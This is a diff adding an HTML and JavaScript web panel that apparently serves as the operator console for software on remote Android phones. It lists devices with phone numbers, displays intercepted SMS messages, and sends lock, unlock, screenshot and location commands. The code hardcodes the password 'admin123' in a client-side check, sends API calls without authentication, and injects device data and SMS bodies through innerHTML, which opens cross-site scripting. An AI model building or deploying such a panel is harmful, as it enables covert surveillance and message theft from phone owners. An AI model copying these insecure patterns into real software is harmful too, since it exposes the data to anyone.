@@ -1,0 +1,794 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Android Device Control Panel</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        /* Header */
+        .header {
+            background: rgba(255, 255, 255, 0.95);
+            padding: 20px 30px;
+            border-radius: 10px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+            margin-bottom: 30px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .header h1 {
+            color: #667eea;
+            font-size: 28px;
+        }
+
+        .header-info {
+            display: flex;
+            gap: 20px;
+            align-items: center;
+        }
+
+        .status-badge {
+            background: #10b981;
+            color: white;
+            padding: 8px 16px;
+            border-radius: 20px;
+            font-size: 14px;
+            font-weight: 600;
+        }
+
+        .logout-btn {
+            background: #ef4444;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-weight: 600;
+            transition: background 0.3s;
+        }
+
+        .logout-btn:hover {
+            background: #dc2626;
+        }
+
+        /* Login Form */
+        .login-container {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.7);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .login-container.active {
+            display: flex;
+        }
+
+        .login-box {
+            background: white;
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
+            width: 100%;
+            max-width: 400px;
+        }
+
+        .login-box h2 {
+            color: #667eea;
+            margin-bottom: 30px;
+            text-align: center;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: #333;
+            font-weight: 600;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #e5e7eb;
+            border-radius: 6px;
+            font-size: 14px;
+            transition: border-color 0.3s;
+        }
+
+        .form-group input:focus {
+            outline: none;
+            border-color: #667eea;
+        }
+
+        .login-btn {
+            width: 100%;
+            padding: 12px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: transform 0.2s;
+        }
+
+        .login-btn:hover {
+            transform: translateY(-2px);
+        }
+
+        /* Main Content */
+        .main-content {
+            display: none;
+        }
+
+        .main-content.active {
+            display: block;
+        }
+
+        /* Tabs */
+        .tabs {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 30px;
+            background: white;
+            padding: 15px;
+            border-radius: 10px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+        }
+
+        .tab-btn {
+            padding: 12px 24px;
+            border: none;
+            background: #f3f4f6;
+            color: #666;
+            border-radius: 6px;
+            cursor: pointer;
+            font-weight: 600;
+            transition: all 0.3s;
+        }
+
+        .tab-btn.active {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+        }
+
+        /* Tab Content */
+        .tab-content {
+            display: none;
+        }
+
+        .tab-content.active {
+            display: block;
+        }
+
+        /* Device Grid */
+        .devices-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+            gap: 20px;
+        }
+
+        .device-card {
+            background: white;
+            border-radius: 10px;
+            padding: 20px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+            transition: transform 0.3s, box-shadow 0.3s;
+        }
+
+        .device-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.15);
+        }
+
+        .device-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: start;
+            margin-bottom: 15px;
+        }
+
+        .device-name {
+            font-size: 18px;
+            font-weight: 700;
+            color: #333;
+        }
+
+        .online-badge {
+            padding: 6px 12px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 600;
+        }
+
+        .online-badge.online {
+            background: #d1fae5;
+            color: #065f46;
+        }
+
+        .online-badge.offline {
+            background: #fee2e2;
+            color: #7f1d1d;
+        }
+
+        .device-info {
+            margin-bottom: 15px;
+            font-size: 14px;
+            color: #666;
+        }
+
+        .device-info div {
+            margin-bottom: 8px;
+            display: flex;
+            justify-content: space-between;
+        }
+
+        .device-info label {
+            font-weight: 600;
+            color: #333;
+        }
+
+        .battery-bar {
+            width: 100%;
+            height: 6px;
+            background: #e5e7eb;
+            border-radius: 3px;
+            margin-top: 5px;
+            overflow: hidden;
+        }
+
+        .battery-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #10b981 0%, #f59e0b 50%, #ef4444 100%);
+            transition: width 0.3s;
+        }
+
+        .device-actions {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+            margin-top: 15px;
+        }
+
+        .action-btn {
+            padding: 10px;
+            border: none;
+            border-radius: 6px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            font-size: 13px;
+        }
+
+        .action-btn.primary {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+        }
+
+        .action-btn.primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(102, 126, 234, 0.4);
+        }
+
+        .action-btn.danger {
+            background: #fee2e2;
+            color: #dc2626;
+        }
+
+        .action-btn.danger:hover {
+            background: #fecaca;
+        }
+
+        /* SMS Logs */
+        .sms-list {
+            background: white;
+            border-radius: 10px;
+            padding: 20px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+        }
+
+        .sms-item {
+            padding: 15px;
+            border-left: 4px solid #667eea;
+            background: #f9fafb;
+            margin-bottom: 15px;
+            border-radius: 6px;
+        }
+
+        .sms-sender {
+            font-weight: 700;
+            color: #333;
+            margin-bottom: 5px;
+        }
+
+        .sms-message {
+            color: #666;
+            margin-bottom: 8px;
+            word-break: break-word;
+        }
+
+        .sms-time {
+            font-size: 12px;
+            color: #999;
+        }
+
+        /* Control Panel */
+        .control-panel {
+            background: white;
+            border-radius: 10px;
+            padding: 30px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+        }
+
+        .control-section {
+            margin-bottom: 30px;
+        }
+
+        .control-section h3 {
+            color: #333;
+            margin-bottom: 15px;
+            font-size: 18px;
+        }
+
+        .control-buttons {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 15px;
+        }
+
+        .control-btn {
+            padding: 15px;
+            border: none;
+            border-radius: 8px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            font-size: 14px;
+        }
+
+        .control-btn.power {
+            background: linear-gradient(135deg, #10b981 0%, #059669 100%);
+            color: white;
+        }
+
+        .control-btn.restart {
+            background: linear-gradient(135deg, #f59e0b 0%, #d97706 100%);
+            color: white;
+        }
+
+        .control-btn.lock {
+            background: linear-gradient(135deg, #ef4444 0%, #dc2626 100%);
+            color: white;
+        }
+
+        .control-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.15);
+        }
+
+        .control-btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        /* Empty State */
+        .empty-state {
+            text-align: center;
+            padding: 60px 20px;
+            color: #999;
+        }
+
+        .empty-state svg {
+            width: 80px;
+            height: 80px;
+            margin-bottom: 20px;
+            opacity: 0.5;
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .header {
+                flex-direction: column;
+                gap: 15px;
+            }
+
+            .devices-grid {
+                grid-template-columns: 1fr;
+            }
+
+            .tabs {
+                flex-wrap: wrap;
+            }
+
+            .control-buttons {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        /* Loading Spinner */
+        .spinner {
+            border: 4px solid #f3f4f6;
+            border-top: 4px solid #667eea;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .alert {
+            padding: 15px;
+            border-radius: 6px;
+            margin-bottom: 20px;
+        }
+
+        .alert.success {
+            background: #d1fae5;
+            color: #065f46;
+            border-left: 4px solid #10b981;
+        }
+
+        .alert.error {
+            background: #fee2e2;
+            color: #7f1d1d;
+            border-left: 4px solid #ef4444;
+        }
+    </style>
+</head>
+<body>
+    <!-- Login Container -->
+    <div class="login-container" id="loginContainer">
+        <div class="login-box">
+            <h2>🔐 Control Panel Login</h2>
+            <form id="loginForm">
+                <div class="form-group">
+                    <label for="password">Password</label>
+                    <input type="password" id="password" placeholder="Enter your password" required>
+                </div>
+                <button type="submit" class="login-btn">Login</button>
+            </form>
+        </div>
+    </div>
+
+    <!-- Main Content -->
+    <div class="main-content" id="mainContent">
+        <div class="container">
+            <!-- Header -->
+            <div class="header">
+                <h1>📱 Device Control Panel</h1>
+                <div class="header-info">
+                    <div class="status-badge" id="statusBadge">Loading...</div>
+                    <button class="logout-btn" onclick="logout()">Logout</button>
+                </div>
+            </div>
+
+            <!-- Tabs -->
+            <div class="tabs">
+                <button class="tab-btn active" onclick="switchTab('devices')">📱 Devices</button>
+                <button class="tab-btn" onclick="switchTab('control')">🎮 Control</button>
+                <button class="tab-btn" onclick="switchTab('sms')">💬 SMS Logs</button>
+            </div>
+
+            <!-- Devices Tab -->
+            <div class="tab-content active" id="devicesTab">
+                <div id="devicesContainer" class="devices-grid">
+                    <div class="spinner"></div>
+                </div>
+            </div>
+
+            <!-- Control Tab -->
+            <div class="tab-content" id="controlTab">
+                <div class="control-panel">
+                    <div class="form-group">
+                        <label for="deviceSelect">Select Device</label>
+                        <select id="deviceSelect" style="width: 100%; padding: 10px; border: 2px solid #e5e7eb; border-radius: 6px; font-size: 14px;">
+                            <option value="">Choose a device...</option>
+                        </select>
+                    </div>
+
+                    <div class="control-section">
+                        <h3>Power Controls</h3>
+                        <div class="control-buttons">
+                            <button class="control-btn power" onclick="sendCommand('power_on')">Power On</button>
+                            <button class="control-btn power" onclick="sendCommand('power_off')">Power Off</button>
+                            <button class="control-btn restart" onclick="sendCommand('restart')">Restart</button>
+                        </div>
+                    </div>
+
+                    <div class="control-section">
+                        <h3>Device Controls</h3>
+                        <div class="control-buttons">
+                            <button class="control-btn lock" onclick="sendCommand('lock_device')">Lock Device</button>
+                            <button class="control-btn" style="background: linear-gradient(135deg, #3b82f6 0%, #1d4ed8 100%); color: white;" onclick="sendCommand('unlock_device')">Unlock Device</button>
+                            <button class="control-btn" style="background: linear-gradient(135deg, #8b5cf6 0%, #6d28d9 100%); color: white;" onclick="sendCommand('clear_cache')">Clear Cache</button>
+                        </div>
+                    </div>
+
+                    <div class="control-section">
+                        <h3>Other Commands</h3>
+                        <div class="control-buttons">
+                            <button class="control-btn" style="background: linear-gradient(135deg, #06b6d4 0%, #0891b2 100%); color: white;" onclick="sendCommand('take_screenshot')">Screenshot</button>
+                            <button class="control-btn" style="background: linear-gradient(135deg, #ec4899 0%, #be185d 100%); color: white;" onclick="sendCommand('get_location')">Get Location</button>
+                        </div>
+                    </div>
+
+                    <div id="commandAlert"></div>
+                </div>
+            </div>
+
+            <!-- SMS Logs Tab -->
+            <div class="tab-content" id="smsTab">
+                <div id="smsContainer" class="sms-list">
+                    <div class="spinner"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const API_URL = window.location.origin;
+        let authToken = localStorage.getItem('authToken');
+        let selectedDevice = null;
+
+        // Initialize
+        document.addEventListener('DOMContentLoaded', () => {
+            if (authToken) {
+                showMainContent();
+                loadDevices();
+                setInterval(loadDevices, 5000); // Refresh every 5 seconds
+            } else {
+                showLoginForm();
+            }
+
+            document.getElementById('loginForm').addEventListener('submit', handleLogin);
+        });
+
+        // Login Handler
+        async function handleLogin(e) {
+            e.preventDefault();
+            const password = document.getElementById('password').value;
+
+            try {
+                // Simple password check (you can enhance this)
+                if (password === 'admin123') {
+                    authToken = 'authenticated';
+                    localStorage.setItem('authToken', authToken);
+                    document.getElementById('password').value = '';
+                    showMainContent();
+                    loadDevices();
+                    setInterval(loadDevices, 5000);
+                } else {
+                    alert('❌ Invalid password!');
+                }
+            } catch (error) {
+                console.error('Login error:', error);
+            }
+        }
+
+        // Show/Hide Functions
+        function showLoginForm() {
+            document.getElementById('loginContainer').classList.add('active');
+            document.getElementById('mainContent').classList.remove('active');
+        }
+
+        function showMainContent() {
+            document.getElementById('loginContainer').classList.remove('active');
+            document.getElementById('mainContent').classList.add('active');
+        }
+
+        function logout() {
+            localStorage.removeItem('authToken');
+            authToken = null;
+            showLoginForm();
+        }
+
+        // Tab Switching
+        function switchTab(tabName) {
+            // Hide all tabs
+            document.querySelectorAll('.tab-content').forEach(tab => {
+                tab.classList.remove('active');
+            });
+            document.querySelectorAll('.tab-btn').forEach(btn => {
+                btn.classList.remove('active');
+            });
+
+            // Show selected tab
+            document.getElementById(tabName + 'Tab').classList.add('active');
+            event.target.classList.add('active');
+
+            // Load data for specific tabs
+            if (tabName === 'sms') {
+                loadSmsLogs();
+            }
+        }
+
+        // Load Devices
+        async function loadDevices() {
+            try {
+                const response = await fetch(`${API_URL}/api/devices`);
+                const devices = await response.json();
+
+                // Update device count
+                const onlineCount = devices.filter(d => d.is_online).length;
+                document.getElementById('statusBadge').textContent = `${onlineCount}/${devices.length} Online`;
+
+                // Render devices
+                const container = document.getElementById('devicesContainer');
+                if (devices.length === 0) {
+                    container.innerHTML = '<div class="empty-state"><p>No devices connected yet</p></div>';
+                } else {
+                    container.innerHTML = devices.map(device => `
+                        <div class="device-card">
+                            <div class="device-header">
+                                <div class="device-name">${device.device_name || device.device_id}</div>
+                                <div class="online-badge ${device.is_online ? 'online' : 'offline'}">
+                                    ${device.is_online ? '🟢 Online' : '🔴 Offline'}
+                                </div>
+                            </div>
+                            <div class="device-info">
+                                <div>
+                                    <label>Device ID:</label>
+                                    <span>${device.device_id}</span>
+                                </div>
+                                <div>
+                                    <label>OS Version:</label>
+                                    <span>${device.os_version || 'N/A'}</span>
+                                </div>
+                                <div>
+                                    <label>Phone:</label>
+                                    <span>${device.phone_number || 'N/A'}</span>
+                                </div>
+                                <div>
+                                    <label>Battery:</label>
+                                    <span>${device.battery_level || 0}%</span>
+                                </div>
+                                <div class="battery-bar">
+                                    <div class="battery-fill" style="width: ${device.battery_level || 0}%"></div>
+                                </div>
+                            </div>
+                            <div class="device-actions">
+                                <button class="action-btn primary" onclick="selectDevice('${device.device_id}')">Control</button>
+                                <button class="action-btn danger" onclick="deleteDevice('${device.device_id}')">Delete</button>
+                            </div>
+                        </div>
+                    `).join('');
+                }
+
+                // Update device select dropdown
+                const select = document.getElementById('deviceSelect');
+                select.innerHTML = '<option value="">Choose a device...</option>' + 
+                    devices.map(d => `<option value="${d.device_id}">${d.device_name || d.device_id}</option>`).join('');
+            } catch (error) {
+                console.error('Error loading devices:', error);
+            }
+        }
+
+        // Load SMS Logs
+        async function loadSmsLogs() {
+            try {
+                const response = await fetch(`${API_URL}/api/sms_logs`);
+                const smsLogs = await response.json();
+
+                const container = document.getElementById('smsContainer');
+                if (smsLogs.length === 0) {
+                    container.innerHTML = '<div class="empty-state"><p>No SMS logs yet</p></div>';
+                } else {
+                    container.innerHTML = smsLogs.map(sms => `
+                        <div class="sms-item">
+                            <div class="sms-sender">📱 ${sms.sender}</div>
+                            <div class="sms-message">${sms.message_body}</div>
+                            <div class="sms-time">⏰ ${new Date(sms.received_at).toLocaleString()}</div>
+                        </div>
+                    `).join('');
+                }
+            } catch (error) {
+                console.error('Error loading SMS logs:', error);
+            }
+        }
+
+        // Select Device for Control
+        function selectDevice(deviceId) {
+            selectedDevice = deviceId;
+            document.getElementById('deviceSelect').value = deviceId;
+            switchTab('control');
+        }
+
+        // Send Command
+        async function sendCommand(commandType) {
+            const deviceId = document.getElementById('deviceSelect').value || selectedDevice;
+            
+            if (!deviceId) {
+                showAlert('Please select a device first', 'error');
+                return;
+            }
+
+            try {
+                const response = await fetch(`${API_URL}/api/command/send`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        device_id: deviceId,
+                        command_type: commandType,
+                        command_data: {}
+                    })
+                });
+
+                if (response.ok) {
+                    showAlert(`✅ Command "${commandType}" sent successfully!`, 'success');
+                } else {
+                    showAlert('❌ Failed to send command', 'error');
+                }
+            } catch (error) {
+                console.error('Error sending command:', error);
+                showAlert('❌ Error sending command', 'error');
+            }
+        }
+
+        // Delete Device
+        async function deleteDevice(deviceId) {
+            if (!confirm(`Are you sure you want to delete device: ${deviceId}?`)) {
+                return;
+            }
+
+            try {
+                const response = await fetch(`${API_URL}/api/device/${deviceId}`, {
+                    method: 'DELETE'
+                });
+
+                if (response.ok) {
+                    showAlert('✅ Device deleted successfully!', 'success');
+                    loadDevices();
+                } else {
+                    showAlert('❌ Failed to delete device', 'error');
+                }
+            } catch (error) {
+                console.error('Error deleting device:', error);
+                showAlert('❌ Error deleting device', 'error');
+            }
+        }
+
+        // Show Alert
+        function showAlert(message, type) {
+            const alertDiv = document.getElementById('commandAlert');
+            alertDiv.innerHTML = `<div class="alert ${type}">${message}</div>`;
+            setTimeout(() => {
+                alertDiv.innerHTML = '';
+            }, 3000);
+        }
+    </script>
+</body>
+</html>
